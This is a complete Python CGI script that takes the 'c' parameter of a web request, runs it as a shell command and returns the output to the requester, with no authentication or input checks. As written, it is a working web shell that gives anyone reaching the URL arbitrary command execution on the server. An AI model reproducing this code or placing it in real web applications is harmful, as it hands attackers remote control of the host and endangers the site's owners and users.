#!/usr/bin/python3
print("content-type: text/html\n")

import cgi
import subprocess
import os
form=cgi.FieldStorage()
cmd=form.getvalue("c")
output=subprocess.getoutput(cmd)
print(output)
